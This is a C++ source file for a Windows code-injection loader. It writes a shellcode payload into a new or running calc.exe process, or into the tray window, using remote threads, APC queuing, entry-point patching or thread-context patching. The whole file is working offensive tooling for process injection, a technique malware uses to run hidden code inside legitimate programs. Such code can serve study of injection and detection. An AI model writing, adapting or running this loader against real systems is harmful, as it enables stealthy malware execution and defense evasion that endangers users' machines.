#include <Windows.h>
#include <iostream>
#include <sstream>

#include "main.h"
#include "createproc.h"
#include "enumproc.h"

#include "payload.h"
#include "map_buffer_into_process.h"
#include "sysutil.h"

typedef enum {
    ADD_THREAD,
    ADD_APC,
    PATCH_EP,
    PATCH_CONTEXT
} INJECTION_POINT;

typedef enum {
    EXISTING_PROC = 0,
    NEW_PROC,
    TRAY_WINDOW,
    TARGET_TYPE_COUNT
} TARGET_TYPE;

using namespace std;

bool inject_in_new_process(INJECTION_POINT mode)
{
    //get target path
    WCHAR cmdLine[MAX_PATH];
    get_calc_path(cmdLine, MAX_PATH);

    WCHAR startDir[MAX_PATH];
    if (!get_dir(cmdLine, startDir)) {
        GetSystemDirectory(startDir, MAX_PATH);
    }
    printf("Target: %S\n", cmdLine);
    //create suspended process
    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(PROCESS_INFORMATION));
    if (create_new_process2(pi, cmdLine, startDir) == false) {
        return false;
    }
    LPVOID remote_shellcode_ptr = map_buffer_into_process1(pi.hProcess, g_Shellcode, sizeof(g_Shellcode), PAGE_EXECUTE_READWRITE);
    bool result = false;
    switch (mode) {
    case ADD_THREAD:
        result = run_shellcode_in_new_thread(pi.hProcess, remote_shellcode_ptr, THREAD_CREATION_METHOD::usingRandomMethod);
        // not neccessery to resume the main thread
        break;
    case ADD_APC:
        result = add_shellcode_to_apc(pi.hThread, remote_shellcode_ptr);
        ResumeThread(pi.hThread); //resume the main thread
        break;
    case PATCH_EP:
        result = paste_shellcode_at_ep(pi.hProcess, remote_shellcode_ptr, pi.hThread);
        ResumeThread(pi.hThread); //resume the main thread
        break;
    case PATCH_CONTEXT:
        result = patch_context(pi.hThread, remote_shellcode_ptr);
        ResumeThread(pi.hThread); //resume the main thread
        break;
    }
    
    //close handles
    ZwClose(pi.hThread);
    ZwClose(pi.hProcess);
    return result;
}

bool inject_in_existing_process()
{
    wchar_t *process_name = L"calc.exe";
    HANDLE hProcess = find_running_process(process_name);
    if (!hProcess) {
        std::wcerr << "[ERROR] Process with the name: " << process_name << " not found!\n";
        return false;
    }
    LPVOID remote_shellcode_ptr = map_buffer_into_process1(hProcess, g_Shellcode, sizeof(g_Shellcode), PAGE_EXECUTE_READWRITE);
    if (remote_shellcode_ptr == NULL) {
        return false;
    }
    return run_shellcode_in_new_thread(hProcess, remote_shellcode_ptr, THREAD_CREATION_METHOD::usingRandomMethod);
}

int loadInt(const std::string &str)
{
    int intVal = 0;

    std::stringstream ss;
    ss << std::dec << str;
    ss >> intVal;

    return intVal;
}

int main(int argc, char *argv[])
{
    TARGET_TYPE targetType = TARGET_TYPE::NEW_PROC;
    if (argc < 2) {
        std::cout << "args: <targetType>\n";
        std::cout << "targetType:\n";
        std::cout << "\t" << std::dec << TARGET_TYPE::EXISTING_PROC << " : EXISTING_PROC\n";
        std::cout << "\t" << std::dec << TARGET_TYPE::NEW_PROC << " : NEW_PROC\n";
        std::cout << "\t" << std::dec << TARGET_TYPE::TRAY_WINDOW << " : TRAY_WINDOW\n";
        std::cout << "\t---\n";
        std::cout << "\tdefault: " << targetType << " \n";
    }


   if (load_ntdll_functions() == FALSE) {
        printf("Failed to load NTDLL function\n");
        return (-1);
    }
    if (load_kernel32_functions() == FALSE) {
        printf("Failed to load KERNEL32 function\n");
        return (-1);
    }

    // compatibility  checks:
    if (!is_system32b()) {
        printf("[WARNING] Your ystem is NOT 32 bit! Some of the methods may not work.\n");
    }
    if (!is_compiled_32b()) {
        printf("[WARNING] It is recommended to compile the loader as a 32 bit application!\n");
    }
    // choose the method:

    if (argc > 1) {
        targetType = (TARGET_TYPE)loadInt(argv[1]);
        if (targetType >= TARGET_TYPE_COUNT) targetType = TARGET_TYPE::NEW_PROC;
    }

    switch (targetType) {
    case TARGET_TYPE::TRAY_WINDOW:
        if (!is_system32b()) {
            printf("[ERROR] Not supported! Your system is NOT 32 bit!\n");
            break;
        }
        // this injection is more fragile, use shellcode that makes no assumptions about the context
        if (inject_into_tray(g_Shellcode, sizeof(g_Shellcode))) {
             printf("[SUCCESS] Code injected into tray window!\n");
        }
        break;
    case TARGET_TYPE::EXISTING_PROC:
        if (inject_in_existing_process()) {
            printf("[SUCCESS] Code injected into existing process!\n");
        }
        else {
            printf("[ERROR] Could not inject code into existing process!\n");
        }
        break;
    case TARGET_TYPE::NEW_PROC:
        if (inject_in_new_process(INJECTION_POINT::PATCH_EP)) {
             printf("[SUCCESS] Code injected into a new process!\n");
        }
        else {
            printf("[ERROR] Could not inject code into a new process!\n");
        }
        break;
    }

    system("pause");
    return 0;
}
